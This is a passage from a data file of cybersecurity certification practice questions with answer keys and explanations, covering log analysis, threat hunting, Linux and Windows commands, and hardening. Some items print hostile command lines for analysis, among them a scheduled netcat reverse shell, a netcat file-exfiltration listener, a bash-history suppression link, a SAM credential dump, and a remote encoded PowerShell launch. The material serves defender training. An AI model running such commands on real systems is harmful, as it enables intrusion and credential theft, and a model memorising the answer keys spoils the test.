server.\" loading=\"lazy\" src=\"img/pt/c01un005.png\"/></figure>","o":["The firewall","The router","The distribution switch","The Windows server"],"a":0,"e":"Since Andrea is attempting to stop external scans from gathering information about her network topology, the firewall is the best place to stop them. A well-designed ruleset can stop, or at least limit, the amount of network topology information that attackers can collect.","l":"c1-network","l2":"c5-recon","k":"Firewall rules against network reconnaissance"},{"id":"d1-115","set":"d1","ch":1,"d":1,"q":"Cormac needs to lock down a Windows workstation that has recently been scanned using Nmap on a Kali Linux–based system, with the results shown here. He knows that the workstation needs to access websites and that the system is part of a Windows domain. What ports should he allow through the system’s firewall for externally initiated connections?\n<figure><img alt=\"Screenshot lists N map scan results for host dynamo at 192.168.1.14 with 12 open ports and A S Rock Incorporation hardware.\" loading=\"lazy\" src=\"img/pt/c01un006.png\"/></figure>","o":["80, 135, 139, and 445.","80, 445, and 3389.","135, 139, and 445.","No ports should be open."],"a":3,"e":"The uses described for the workstation that Cormac is securing do not require inbound access to the system on any of these ports. Web browsing and Active Directory domain membership traffic can be handled by traffic initiated by the system.","l":"c1-network","l2":"c2-os","k":"Host firewall inbound port hardening"},{"id":"d1-116","set":"d1","ch":3,"d":1,"q":"Frank’s team uses the following query to identify events in their threat intelligence tool. Why would this scenario be of concern to the security team?\n<pre>\n<code>select * from network-events where data.process.image.file = </code>\n<code>'cmd.exe' AND data.process.parentImage.file != 'explorer.exe' </code>\n<code>AND data.process. action = 'launch'</code>\n</pre>","o":["Processes other than <code>explorer.exe</code> typically do not launch command prompts.","<code>cmd.exe</code> should never launch <code>explorer.exe</code>.","<code>explorer.exe</code> provides administrative access to systems.","<code>cmd.exe</code> runs as administrator by default when launched outside of Explorer."],"a":0,"e":"For most Windows user workstations, launches of <code>cmd.exe</code> by programs other than Explorer are not typical. This script will identify those launches and will alarm on them, helping to find LOLBins-style executable usage.","l":"c3-host","l2":"c4-hunt","k":"Anomalous process parent-child execution"},{"id":"d1-117","set":"d1","ch":3,"d":1,"q":"Mark writes a script to pull data from his security data repository. The script includes the following query:\n<pre>\n<code>select <u>source.name</u>, data.process.cmd, count(*) AS hostcount</code>\n<code>from windows-events where type = 'sysmon' AND</code>\n<code>data.process.action = 'launch' AND data.process. image.file =</code>\n<code>'reg.exe' AND data.process.parentImage.file = 'cmd.exe'</code>\n</pre>\n<p>He then queries the returned data using the following script:</p>\n<pre>\n<code>select <u>source.name</u>, data.process.cmd, count(*) AS hostcount</code>\n<code>from network-events where type = 'sysmon' AND</code>\n<code>data.process.action = 'launch' AND data.process. image.file =</code>\n<code>'cmd.exe' AND data.process.parentImage.file = 'explorer.exe'</code>\n</pre>\n<p>What events will Mark see?</p>","o":["Uses of <code>explorer.exe</code> where it is launched by <code>cmd.exe</code>","Registry edits launched via the command line from Explorer","Registry edits launched via <code>explorer.exe</code> that modify <code>cmd.exe</code>","Uses of <code>cmd.exe</code> where it is launched by <code>reg.exe</code>"],"a":1,"e":"The first query will identify times when the <code>reg.exe</code> was launched by <code>cmd.exe</code>. If the same data is searched to correlate with launches of <code>cmd.exe</code> by <code>explorer.exe</code>, Mark will know when Registry edits were launched via the command line (<code>cmd.exe</code>) from Explorer—a process that typically means users have edited the Registry, which should be an uncommon event in most organizations and is likely to be a security concern.","l":"c3-host","l2":"c3-uba-scripting","k":"Command-line registry modifications via Sysmon"},{"id":"d1-118","set":"d1","ch":1,"d":1,"q":"Mateo is responsible for hardening systems on his network, and he discovers that a number of network appliances have exposed services, including telnet, FTP, and web servers. What is his best option to secure these systems?","o":["Enable host firewalls.","Install patches for those services.","Turn off the services for each appliance.","Place a network firewall between the devices and the rest of the network."],"a":3,"e":"Mateo’s only sure bet to prevent these services from being accessed is to put a network firewall in front of them. Many appliances enable services by default; since they are appliances, they may not have host firewalls available to enable. They also often don’t have patches available, and many appliances do not allow the services they provide to be disabled or modified.","l":"c1-network","l2":"c8-controls","k":"Compensating network firewall for legacy appliances"},{"id":"d1-119","set":"d1","ch":3,"d":1,"q":"Deepa wants to see the memory utilization for multiple Linux processes all at once. What command should she run?","o":["<code>top</code>","<code>ls -mem</code>","<code>mem</code>","<code>memstat</code>"],"a":0,"e":"The <code>top</code> command provides a real-time view of the memory usage for a system on a per-process basis. The <code>ls</code> command does not work for memory; <code>mem</code> was made up for this question; and <code>memstat</code> is used to check the state of memcached servers, and it won’t help in this circumstance. If you’re not familiar with basic Linux commands such as <code>top</code>, you should spend some time with a Linux system as you prepare for the CySA+ exam. A basic understanding of common commands can be very helpful.","l":"c3-host","l2":"c2-os","k":"Linux top command memory monitoring"},{"id":"d1-120","set":"d1","ch":3,"d":1,"q":"While reviewing a system she is responsible for, Amanda notices that the system is performing poorly and runs <code>htop</code> to see a graphical representation of system resource usage. She sees the information shown in the following image:\n<figure><img alt=\"Screenshot lists a system administrator with C P U usage percentage on 2 cores, tasks, load average, uptime, and command stress.\" loading=\"lazy\" src=\"img/pt/c01un007.png\"/></figure>\n<p>What issue should Amanda report to the system administrator?</p>","o":["High network utilization","High memory utilization","Insufficient swap space","High CPU utilization"],"a":3,"e":"This view of <code>htop</code> shows both CPU1 and CPU2 are maxed out at 100 percent. Memory is just over 60 percent used. Almost all swap space is available.","l":"c3-host","l2":"","k":"htop resource usage CPU consumption"},{"id":"d1-121","set":"d1","ch":3,"d":1,"q":"While reviewing a system she is responsible for, Amanda notices that the system is performing poorly and runs <code>htop</code> to see a graphical representation of system resource usage. She sees the information shown in the following image. What command could Amanda run to find the process with the highest CPU utilization if she did not have access to <code>htop</code>?\n<figure><img alt=\"Screenshot lists a system administrator with C P U usage percentage on 2 cores, tasks, load average, uptime, and command stress.\" loading=\"lazy\" src=\"img/pt/c01un007.png\"/></figure>","o":["<code>ps</code>","<code>top</code>","<code>proc</code>","<code>load</code>"],"a":1,"e":"The <code>top</code> command will show a dynamic, real-time list of running processes. If Amanda runs this, she will immediately see that two processes are consuming 99% of a CPU each and can see the command that ran the program.","l":"c3-host","l2":"c2-os","k":"top CPU utilization monitoring"},{"id":"d1-122","set":"d1","ch":4,"d":1,"q":"Angela’s EDR alerts to a command that was on a Windows server in her domain:\n<pre>\n<code>lsadump::sam</code>\n</pre>\n<p>What ATT&amp;CK technique should she flag this as?</p>","o":["Security Account Manager dumping","Memory dumping","Cached domain credential dumping","<code>/etc/passwd</code> dumping"],"a":0,"e":"SAM is the local Security Account Manager for Windows systems, and <code>lsadump</code> dumps local credentials. If you’re not familiar with the SAM, you can still rule out <code>/etc/password</code> (because this is a Windows system, not Linux) and consider the acronym to help narrow down the answer.","l":"c4-classify","l2":"c3-tip-edr","k":"SAM credential dumping"},{"id":"d1-123","set":"d1","ch":3,"d":1,"q":"While reviewing output from the <code>netstat</code> command, John sees the following output. What should his next action be?\n<pre>\n<code>[minesweeper.exe]</code>\n<code>  TCP    127.0.0.1:62522        dynamo:0      LISTENING</code>\n<code>[minesweeper.exe]</code>\n<code>TCP    192.168.1.100        151.101.2.69:https  ESTABLISHED</code>\n</pre>","o":["Capture traffic to 151.101.2.69 using Wireshark.","Initiate the organization’s incident response plan.","Check to see if 151.101.2.69 is a valid Microsoft address.","Ignore it; this is a false positive."],"a":1,"e":"John has discovered a program that is both accepting connections and has an open connection, neither of which are typical for the Minesweeper game. Attackers often disguise Trojans as innocuous applications, so John should follow his organization’s incident response plan.","l":"c3-host","l2":"c9-process","k":"suspicious process network activity"},{"id":"d1-124","set":"d1","ch":3,"d":1,"q":"What does EDR use to capture data for analysis and storage in a central database?","o":["A network tap","Network flows","Software agents","Hardware agents"],"a":2,"e":"Endpoint detection and response (EDR) tools use software agents to monitor endpoint systems and to collect data about processes, user and system activity, and network traffic, which is then sent to a central processing, analysis, and storage system.","l":"c3-tip-edr","l2":"","k":"EDR software agents"},{"id":"d1-125","set":"d1","ch":3,"d":1,"q":"While reviewing the command history for an administrative user, Lakshman discovers a suspicious command that was captured:\n<pre>\n<code>ln /dev/null ~/.bash_history</code>\n</pre>\n<p>What action was this user attempting to perform?</p>","o":["Enabling the Bash history","Appending the contents of <code>/dev/null</code> to the Bash history","Logging all shell commands to <code>/dev/null</code>","Allowing remote access from the null shell"],"a":2,"e":"This command will prevent commands entered at the Bash shell prompt from being logged, as they are all sent to <code>/dev/null</code>. This type of action is one reason that administrative accounts are often logged to remote hosts, preventing malicious insiders or attackers who gain administrative access from hiding their tracks.","l":"c3-host","l2":"c2-os","k":"Bash history disabling"},{"id":"d1-126","set":"d1","ch":3,"d":1,"q":"Charles wants to determine whether a message he received was forwarded by analyzing the headers of the message. How can he determine this?","o":["Reviewing the Message-ID to see if it has been incremented.","Checking for the In-Reply-To field.","Checking for the References field.","You cannot determine if a message was forwarded by analyzing the headers."],"a":3,"e":"When an email is forwarded, a new message with a new Message-ID header will be created. The In-Reply-To and References field will also be set as normal. The best option that Charles has is to look for clues like a subject line that reads “FWD”—something that is easily changed.","l":"c3-filesandbox","l2":"c3-cloud-social","k":"email header analysis"},{"id":"d1-127","set":"d1","ch":3,"d":1,"q":"While reviewing the filesystem of a potentially compromised system, Marta sees the following output when running <code>ls -la</code>. What should her next action be after seeing this?\n<figure><img alt=\"Screenshot lists 15 rows of terminal output with permissions, root ownership, file sizes, dates, and names with highlighted password.\" loading=\"lazy\" src=\"img/pt/c01un008.png\"/></figure>","o":["Continue to search for other changes.","Run <code>diff</code> against the password file.","Immediately change her password.","Check the <code>passwd</code> binary against a known good version."],"a":3,"e":"The <code>passwd</code> binary stands out as having recently changed. This may be innocuous, but if Marta believes the machine was compromised, there is a good chance the <code>passwd</code> binary has been replaced with a malicious version. She should check the binary against a known good version and then follow her incident response process if it doesn’t match.","l":"c3-host","l2":"","k":"modified system binary verification"},{"id":"d1-128","set":"d1","ch":3,"d":1,"q":"Susan wants to check a Windows system for unusual behavior. Which of the following persistence techniques is not commonly used for legitimate purposes?","o":["Scheduled tasks","Service replacement","Service creation","Autostart Registry keys"],"a":1,"e":"Scheduled tasks, service creation, and autostart Registry keys are all commonly found on Windows systems for legitimate purposes. Replacing services is far less common unless a known upgrade or patch has occurred.","l":"c3-host","l2":"c2-os","k":"Windows persistence mechanisms"},{"id":"d1-129","set":"d1","ch":4,"d":1,"q":"Matt is reviewing a query that his team wrote for their threat-hunting process. What will the following query warn them about?\n<pre>\n<code>select timeInterval(date, '4h'), 'data.login.user',</code>\n<code>count(distinct <u>data.login.machine.name</u>) as machinecount from</code>\n<code>network-events where data.winevent.EventID = 4624 having</code>\n<code>machinecount&gt; 1</code>\n</pre>","o":["Users who log in more than once a day","Users who are logged in to more than one machine within four hours","Users who do not log in for more than four hours","Users who do not log in to more than one machine in four hours"],"a":1,"e":"Even if you don’t recognize the Windows Event ID, this query provides a number of useful clues. First, it has an interval of four hours, so you know a time frame. Next, it lists <code>data.login.user</code>, which means you are likely querying user logins. Finally, it includes machine count and &gt;1, so you can determine that it is looking for more than one system that has been logged in to. Taken together, this means that the query looks for users who have logged in to more than one machine within any given four-hour period. Matt may want to tune this to a shorter time period, because false positives may result for technical support staff, but since most users won’t log in to more than one machine, this could be a very useful threat-hunting query.","l":"c4-hunt","l2":"c3-uba-scripting","k":"threat hunting login query"},{"id":"d1-130","set":"d1","ch":3,"d":1,"q":"Ben wants to quickly check a suspect binary file for signs of its purpose or other information that it may contain. What Linux tool can quickly show him potentially useful information contained in the file?","o":["<code>grep</code>","<code>more</code>","<code>less</code>","<code>strings</code>"],"a":3,"e":"The <code>strings</code> command extracts strings of printable characters from files, allowing Ben to quickly determine the contents of files. <code>grep</code> would require knowing what he is looking for, and both <code>more</code> and <code>less</code> will simply display the file, which is often not a useful strategy for binaries.","l":"c3-filesandbox","l2":"c3-tools","k":"strings command binary inspection"},{"id":"d1-131","set":"d1","ch":3,"d":1,"q":"Lucas believes that an attacker has successfully compromised his web server. Using the following output of <code>ps</code>, identify the process ID he should focus on:\n<pre>\n<code>root       507  0.0  0.1 258268  3288 ?        Ssl  15:52   0:00 /usr/sbin/rsyslogd -n</code>\n<code>message+   508  0.0  0.2  44176  5160 ?        Ss   15:52   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activa</code>\n<code>root       523  0.0  0.3 281092  6312 ?        Ssl  15:52   0:00 /usr/lib/accountsservice/accounts-daemon</code>\n<code>root       524  0.0  0.7 389760 15956 ?        Ssl  15:52   0:00 /usr/sbin/NetworkManager --no-daemon</code>\n<code>root       527  0.0  0.1  28432  2992 ?        Ss   15:52   0:00 /lib/systemd/systemd-logind</code>\n<code>apache      714  0.0  0.1  27416  2748 ?        Ss   15:52   0:00 /www/temp/webmin</code>\n<code>root       617  0.0  0.1  19312  2056 ?        Ss   15:52   0:00 /usr/sbin/irqbalance --pid=/var/run/irqbalance.pid</code>\n<code>root       644  0.0  0.1 245472  2444 ?        Sl   15:52   0:01 /usr/sbin/VBoxService</code>\n<code>root       653  0.0  0.0  12828  1848 tty1     Ss+  15:52   0:00 /sbin/agetty --noclear tty1 linux</code>\n<code>root       661  0.0  0.3 285428  8088 ?        Ssl  15:52   0:00 /usr/lib/policykit-1/polkitd --no-debug</code>\n<code>root       663  0.0  0.3 364752  7600 ?        Ssl  15:52   0:00 /usr/sbin/gdm3</code>\n<code>root       846  0.0  0.5 285816 10884 ?        Ssl  15:53   0:00 /usr/lib/upower/upowerd</code>\n<code>root       867  0.0  0.3 235180  7272 ?        Sl   15:53   0:00 gdm-session-worker [pam/gdm-launch-environment]</code>\n<code>Debian-+   877  0.0  0.2  46892  4816 ?        Ss   15:53   0:00 /lib/systemd/systemd --user</code>\n<code>Debian-+   878  0.0  0.0  62672  1596 ?        S    15:53   0:00 (sd-pam)</code>\n</pre>","o":["508","617","846","714"],"a":3,"e":"The service running (714) from the <code>www</code> directory as the user <code>apache</code> should be an immediate indication of something strange, and the use of <code>webmin</code> from that directory should also be a strong indicator of something wrong. Lucas should focus on the web server for the point of entry to the system and should review any files that the <code>apache</code> user has created or modified. If local vulnerabilities existed when this compromise occurred, the attacker may have already escalated to another account.","l":"c3-host","l2":"c2-os","k":"suspicious process analysis"},{"id":"d1-132","set":"d1","ch":4,"d":1,"q":"Damian has discovered that systems throughout his organization have been compromised for more than a year by an attacker with significant resources and technology. After a month of attempting to fully remove the intrusion, his organization is still finding signs of compromise despite their best efforts. How would Damian best categorize this threat actor?","o":["Criminal","Hacktivist","APT","Unknown"],"a":2,"e":"Damian has likely encountered an advanced persistent threat (APT). They are characterized as extremely well-resourced actors whose compromises typically have an extended dwell time and the ability to scale capabilities to counter defenders over time.","l":"c4-classify","l2":"","k":"APT threat actor characteristics"},{"id":"d1-133","set":"d1","ch":2,"d":1,"q":"While investigating a compromise, Glenn encounters evidence that a user account has been added to the system he is reviewing. He runs a <code>diff</code> of <code>/etc/shadow</code> and <code>/etc/passwd</code> and sees the following output. What has occurred?\n<pre>\n<code>root:$6$XHxtN5iB$5WOyg3gGfzr9QHPLo.7z0XIQIzEW6Q3/K7iipxG7ue04CmelkjC51SndpOcQlxTHmW4/AKKsKew4f3cb/.BK8/:16828:0:99999:7:::</code>\n<code>&gt; daemon:*:16820:0:99999:7:::</code>\n<code>&gt; bin:*:16820:0:99999:7:::</code>\n<code>&gt; sys:*:16820:0:99999:7:::</code>\n<code>&gt; sync:*:16820:0:99999:7:::</code>\n<code>&gt; games:*:16820:0:99999:7:::</code>\n<code>&gt; man:*:16820:0:99999:7:::</code>\n<code>&gt; lp:*:16820:0:99999:7:::</code>\n<code>&gt; mail:*:16820:0:99999:7:::</code>\n<code>&gt; news:*:16820:0:99999:7:::</code>\n<code>&gt; uucp:*:16820:0:99999:7:::</code>\n<code>&gt; proxy:*:16820:0:99999:7:::</code>\n<code>&gt; www-data:*:16820:0:99999:7:::</code>\n<code>&gt; backup:*:16820:0:99999:7:::</code>\n<code>&gt; list:*:16820:0:99999:7:::</code>\n<code>&gt; irc:*:16820:0:99999:7:::</code>\n</pre>","o":["The root account has been compromised.","An account named <code>daemon</code> has been added.","The shadow password file has been modified.","<code>/etc/shadow</code> and <code>/etc/passwd</code> cannot be <code>diff</code>ed to create a useful comparison."],"a":3,"e":"Linux and Unix systems typically keep user account information stored in <code>/etc/passwd</code>, and <code>/etc/shadow</code> contains password and account expiration information. Using <code>diff</code> between the two files is not a useful strategy in this scenario.","l":"c2-os","l2":"c3-host","k":"Linux passwd and shadow files"},{"id":"d1-134","set":"d1","ch":1,"d":1,"q":"Bruce wants to integrate a security system to his SOAR. The security system provides real-time query capabilities, and Bruce wants to take advantage of this to provide up-to-the-moment data for his SOAR tool. What type of integration is best suited to this?","o":["CSV","Flat file","API","Email"],"a":2,"e":"API-based integrations allow a SOAR environment to send queries as required for the data they need. Flat files and CSVs can be useful when there is no API or when there isn’t support for the API in an environment and real-time integration is not required. Email integrations can result in delays as email delivery is not done at a guaranteed speed and can require additional parsing and processing to extract information. Although it isn’t in the list here, Bruce might consider a direct database connection if he was unable to use an API and wanted real-time data.","l":"c1-efficiency","l2":"c2-infra","k":"SOAR API integration"},{"id":"d1-135","set":"d1","ch":3,"d":1,"q":"Carol wants to analyze email as part of her antispam and antiphishing measures. Which of the following is least likely to show signs of phishing or other email-based attacks?","o":["The email’s headers","Embedded links in the email","Attachments to the email","The email signature block"],"a":3,"e":"Although you may want to analyze the email signature block, it is not likely to contain information that will help Carol identify a phishing message, as the signature text may have been created by the attacker. It is important to note that the signature block refers to the information provided by the user at the end of an email message, not the use of a digital signature. Carol should analyze the entire body of an email for malicious links and payloads. Header data is often checked against IP reputation databases and other checks that can help limit email from spam domains and known malicious senders.","l":"c3-filesandbox","l2":"c3-cloud-social","k":"phishing email analysis"},{"id":"d1-136","set":"d1","ch":3,"d":1,"q":"Juliette wants to decrease the risk of embedded links in email. Which of the following solutions is the most common method for doing this?","o":["Removing all links in email","Redirecting links in email to a proxy","Scanning all email using an antimalware tool","Using a DNS blackhole and IP reputation list"],"a":2,"e":"The most common solution to identifying malicious embedded links in email is to use an antimalware software package to scan all emails. They typically include tools that combine IP and domain reputation lists as well as other heuristic and analytical tools to help identify malicious and unwanted links.","l":"c3-filesandbox","l2":"c3-cloud-social","k":"email link scanning"},{"id":"d1-137","set":"d1","ch":3,"d":1,"q":"James wants to use an automated malware signature creation tool. What type of environment do tools like this unpack and run the malware in?","o":["A sandbox","A physical machine","A container","A DMARC"],"a":0,"e":"Automated malware analysis tools use a secure and instrumented sandbox environment to unpack and run malware so that they can observe and record actions taken by the malware. This is used to perform behavioral analysis as well as to generate file fingerprints and other elements of unique malware signatures. While a physical machine could be used, that can be dangerous if they are connected to the network and will require more effort to rebuild and clean than a sandbox would. Containers share underlying OS components, so are less likely to be used as a sandbox for malware. DMARC is an email security protocol.","l":"c3-filesandbox","l2":"","k":"malware analysis sandbox"},{"id":"d1-138","set":"d1","ch":3,"d":1,"q":"Luis discovers the following entries in <code>/var/log/auth.log</code>. What is most likely occurring?\n<pre>\n<code>Aug  6 14:13:00 demo sshd[5279]: Failed password for root from 10.11.34.11 port 38460 ssh2</code>\n<code>Aug  6 14:13:00 demo sshd[5275]: Failed password for root from 10.11.34.11 port 38452 ssh2</code>\n<code>Aug  6 14:13:00 demo sshd[5284]: Failed password for root from 10.11.34.11 port 38474 ssh2</code>\n<code>Aug  6 14:13:00 demo sshd[5272]: Failed password for root from 10.11.34.11 port 38446 ssh2</code>\n<code>Aug  6 14:13:00 demo sshd[5276]: Failed password for root from 10.11.34.11 port 38454 ssh2</code>\n<code>Aug  6 14:13:00 demo sshd[5273]: Failed password for root from 10.11.34.11 port 38448 ssh2</code>\n<code>Aug  6 14:13:00 demo sshd[5271]: Failed password for root from 10.11.34.11 port 38444 ssh2</code>\n<code>Aug  6 14:13:00 demo sshd[5280]: Failed password for root from 10.11.34.11 port 38463 ssh2</code>\n<code>Aug  6 14:13:01 demo sshd[5302]: Failed password for root from 10.11.34.11 port 38478 ssh2</code>\n<code>Aug  6 14:13:01 demo sshd[5301]: Failed password for root from 10.11.34.11 port 38476 ssh2</code>\n</pre>","o":["A user has forgotten their password.","There was a brute-force attack against the root account.","A service is misconfigured.","There was a denial-of-service attack against the root account."],"a":1,"e":"Repeated failures from the same host likely indicate a brute-force attack against the root account.","l":"c3-tools","l2":"c3-cloud-social","k":"SSH brute-force detection"},{"id":"d1-139","set":"d1","ch":4,"d":1,"q":"Gurvinder notices that his web applications provide debugging information when they return an error. What STRIDE threat model category should he identify this as?","o":["Spoofing","Tampering","Repudiation","Information disclosure"],"a":3,"e":"Gurvinder knows that informative errors can provide attackers with information about applications and the servers they run on. This is an example of information disclosure. No spoofing, tampering, or repudiation has occurred in this problem as described.","l":"c4-classify","l2":"c8-managing","k":"STRIDE information disclosure"},{"id":"d1-140","set":"d1","ch":3,"d":1,"q":"Azra’s network firewall denies all inbound traffic but allows all outbound traffic. While investigating a Windows workstation, she encounters a script that runs the following command:\n<pre>\n<code>at \\\\workstation10 20:30 every:F nc -nv 10.1.2.3 443 -e cmd.exe</code>\n</pre>\n<p>What does it do?</p>","o":["It opens a reverse shell for host 10.1.2.3 using <code>netcat</code> every Friday at 8:30 p.m.","It uses the <code>AT</code> command to dial a remote host via NetBIOS.","It creates an HTTPS session to 10.1.2.3 every Friday at 8:30 p.m.","It creates a VPN connection to 10.1.2.3 every five days at 8:30 p.m. GST."],"a":0,"e":"The <code>at</code> command can be used to schedule Windows tasks. This task starts <code>netcat</code> as a reverse shell using <code>cmd.exe</code> via port 443 every Friday at 8:30 p.m. local time. Azra should be concerned, as this allows traffic in that otherwise might be blocked.","l":"c3-host","l2":"c3-network","k":"netcat reverse shell scheduled task"},{"id":"d1-141","set":"d1","ch":3,"d":1,"q":"While reviewing the <code>auth.log</code> file on a Linux system she is responsible for, Reese discovers the following log entries:\n<pre>\n<code>Aug  6 14:13:06 demo sshd[5273]: PAM 5 more authentication failures; logname= uid=0 euid=0 tty=ssh ruser= rhost=127.0.0.1  user=root</code>\n<code>Aug  6 14:13:06 demo sshd[5273]: PAM service(sshd) ignoring max retries; 6&gt; 3</code>\n<code>Aug  6 14:13:07 demo sshd[5280]: Failed password for root from 127.0.0.1 port 38463 ssh2</code>\n<code>Aug  6 14:13:07 demo sshd[5280]: error: maximum authentication attempts exceeded for root from 127.0.0.1 port 38463 ssh2 [preauth]</code>\n<code>Aug  6 14:13:07 demo sshd[5280]: Disconnecting: Too many authentication failures [preauth]</code>\n</pre>\n<p>Which of the following has not occurred?</p>","o":["A user has attempted to reauthenticate too many times.","PAM is configured for three retries and will reject any additional retries in the same session.","An EDR tool has blocked further logins.","Root is attempting to log in via SSH from the local host."],"a":2,"e":"This output shows a brute-force attack run against the localhost’s root account using SSH. This resulted in the root user attempting to reauthenticate too many times, and PAM has blocked the retries. There is no indication of an EDR tool blocking further logins.","l":"c3-tools","l2":"c2-os","k":"Linux auth.log PAM SSH analysis"},{"id":"d1-142","set":"d1","ch":3,"d":1,"q":"Naomi wants to analyze malware by running it and capturing what it does. What type of tool should she use?","o":["A containerization tool","A virtualization tool","A sandbox tool","A packet analyzer"],"a":2,"e":"The best option for Naomi is a dedicated sandbox tool like Cuckoo Sandbox or a cloud service sandbox like <code>Joe Sandbox</code>. They are designed to isolate the malware while providing instrumentation to capture and analyze the results of the malware execution. Manually building a virtualization environment is a possibility but requires a lot of work to instrument and build tools to analyze the malware. A containerization tool is best suited to app deployment, and a packet analyzer is useful for looking at network traffic.","l":"c3-filesandbox","l2":"","k":"Malware sandbox analysis"},{"id":"d1-143","set":"d1","ch":3,"d":1,"q":"While reviewing logs from users with root privileges on an administrative jump box, Alex discovers the following suspicious command:\n<pre>\n<code>nc -l -p 43501 &lt; example.zip</code>\n</pre>\n<p>What happened?</p>","o":["The user set up a reverse shell running as <code>example.zip</code>.","The user set up <code>netcat</code> as a listener to push <code>example.zip</code>.","The user set up a remote shell running as <code>example.zip</code>.","The user set up <code>netcat</code> to receive <code>example.zip</code>."],"a":1,"e":"The -<code>l</code> flag is a key hint here, indicating that <code>netcat</code> was set up as a listener. Any connection to port 43501 will result in <code>example.zip</code> being sent to the connecting application. Typically, a malicious user would then connect to that port using <code>netcat</code> from a remote system to download the file, possibly as part of a data exfiltration effort or to distribute malware.","l":"c3-host","l2":"c3-network","k":"Netcat listener data exfiltration"},{"id":"d1-144","set":"d1","ch":3,"d":1,"q":"Susan’s EDR flags the following command that was run on a Windows workstation. What is occurring?\n<pre>\n<code>wmic.exe /node:\"10.1.1.50\" /user:\"Domain\\Admin\" process call create \"powershell -enc Y3VyaW9zaXR5IGlzIGEgY3JpdGljYWwgc2tpbGwgZm9yIHNlY3VyaXR5IGFuYWx5c3RzIQ==\"</code>\n</pre>","o":["A new domain administrator account is being created.","An obfuscated remote PowerShell command is being run.","A reverse shell is being run to download a file.","A reverse shell is being run to upload a file."],"a":1,"e":"This command connects to a remote node at 10.1.1.50, then runs a PowerShell command that has been encoded to obfuscate it under a domain admin account. While that command could create an account or do something else, there’s not enough information to answer this question with that level of detail.","l":"c3-host","l2":"c3-uba-scripting","k":"WMIC remote encoded PowerShell"},{"id":"d1-145","set":"d1","ch":2,"d":1,"q":"Lucca’s MDM tool has flagged a BYOD device as noncompliant, listing the device status as Jailbroken. What action should the MDM be set to take in this scenario?","o":["Block access to corporate resources.","Place the network on an unrestricted network.","Rerun the system update process.","Create a new profile to match the phone’s configuration."],"a":0,"e":"Jailbroken phones are security risks because their security controls have been bypassed. The MDM should not allow the device to access organizational data or networks. An unrestricted network would create more risk than a restricted network, updating the device will not necessarily remove the jailbreak, and a new profile would not help address the jailbreak.","l":"c2-iam","l2":"c3-tip-edr","k":"MDM jailbroken device compliance"},{"id":"d1-146","set":"d1","ch":8,"d":1,"q":"Ian’s system management console lists multiple Windows workstations as differing from the organization’s configuration baseline that uses CIS templates. The workstations list Remote Desktop services as enabled. What should Ian do to resolve this issue?","o":["Install EDR software.","Reapply the baseline.","Review logs to identify when the change was made and who made it to determine if a security event may have occurred.","Declare an incident, investigate the compromise, and mark the baseline variance as a false positive."],"a":2,"e":"Ian should investigate to determine both why and how the change was made. Enabling Remote Desktop is a common technique for attackers but might also have business purposes. Once Ian has determined why the devices are deviating from the baseline, he can determine if an exception should be made, if the baseline needs to be reapplied, if an alternate solution like an RDP server is needed, or if an incident needs to declared.","l":"c8-controls","l2":"c3-host","k":"Configuration baseline deviation investigation"},{"id":"d1-147","set":"d1","ch":3,"d":1,"q":"While reviewing web server logs, Danielle notices the following entry. What occurred?\n<pre>\n<code>10.11.210.6 - GET /wordpress/wp-admin/theme-editor.php?file=404.php&amp;theme= total 200</code>\n</pre>","o":["A theme was changed.","A file was not found.","An attempt was made to edit the 404 page.","The 404 page was displayed."],"a":2,"e":"Attackers often use built-in editing tools that are inadvertently or purposefully exposed to edit files to inject malicious code. In this case, someone has attempted to modify the 404 file displayed by WordPress. Anybody who received a 404 error from this installation could have been exposed to malicious code inserted into the 404 page or simply a defaced 404 page.","l":"c3-cloud-social","l2":"c7-web-ot","k":"Web server log theme-editor modification"},{"id":"d1-148","set":"d1","ch":1,"d":1,"q":"Melissa wants to deploy a tool to coordinate information from a wide range of platforms so that she can see it in a central location and then automate responses as part of security workflows. What type of tool should she deploy?","o":["UEBA","SOAR","SIEM","MDR"],"a":1,"e":"A security orchestration, automation, and response (SOAR) tool is focused on exactly what Melissa needs to do. While SIEM provides similar functionality, the key differentiator is the breadth of the platforms that SOAR tools can acquire data from, as well as the process automation capabilities they bring. User entity behavior analytics (UEBA) tools focus on behaviors rather than on a broad set of organizational data, and managed detection response (MDR) systems are used to speed up detection, rather than for compliance and orchestration.","l":"c1-efficiency","l2":"","k":"SOAR centralized automation workflow"},{"id":"d1-149","set":"d1","ch":3,"d":1,"q":"While reviewing the Wireshark packet capture shown here, Ryan notes an extended session using the ESP protocol. When he clicks the packets, he is unable to make sense of the content. What should Ryan look for on the workstation with IP address 10.0.0.1 if he investigates it in person?\n<figure><img alt=\"Screenshot of an interface depicts a network traffic capture with packet lists, Internet Protocol version 4 details, and hexadecimal data.\" loading=\"lazy\" src=\"img/pt/c01un009.png\"/></figure>","o":["An encrypted RAT","A VPN application","A secure web browser","A Base64-encoded packet transfer utility"],"a":1,"e":"Encapsulating Security Payload (ESP) packets are part of the IPsec protocol suite and are typically associated with a tunnel or VPN. Ryan should check for a VPN application and determine what service or system the user may have connected to.","l":"c3-tools","l2":"c2-netarch","k":"IPsec ESP packet capture analysis"},{"id":"d1-150","set":"d1","ch":3,"d":1,"q":"While reviewing indicators of compromise, Dustin notices that <code>notepad.exe</code> has opened a listener port on the Windows machine he is investigating. What is this an example of?","o":["Anomalous behavior","Heuristic behavior","Entity behavior","Known-good behavior"],"a":0,"e":"A desktop application that does not normally provide remote access opening a service port is an example of anomalous behavior. If a web server opened TCP/80 or TCP/443, it would be expected behavior and is likely to be known good behavior. Entity and heuristic behavior were both made up for this question.","l":"c3-host","l2":"","k":"Anomalous process behavior"},{"id":"d1-151","set":"d1","ch":1,"d":1,"q":"How does data enrichment differ from threat feed combination?","o":["Data enrichment is a form of threat feed combination for security insights, focuses on adding more threat feeds together for a full picture, and removes third-party data to focus on core data elements rather than adding together multiple data sources.","Data enrichment uses events and nonevent information to improve security insights, instead of just combining threat information.","Threat feed combination is more useful than data enrichment because of its focus on only the threats.","Threat feed combination techniques are mature, and data enrichment is not ready for enterprise use."],"a":1,"e":"Data enrichment combines data from multiple sources such as directories, geolocation information, and other data sources as well as threat feeds to provide deeper and broader security insights. It is not just a form of threat feed combination, and threat feed combination is a narrower technique than data enrichment is.","l":"c1-efficiency","l2":"c4-collect","k":"Incident response data enrichment"},{"id":"d1-152","set":"d1","ch":3,"d":1,"q":"Which of the following capabilities is not a typical part of a SIEM system?","o":["Alerting","Performance management","Data aggregation","Log retention"],"a":1,"e":"Security information and event management (SIEM) systems 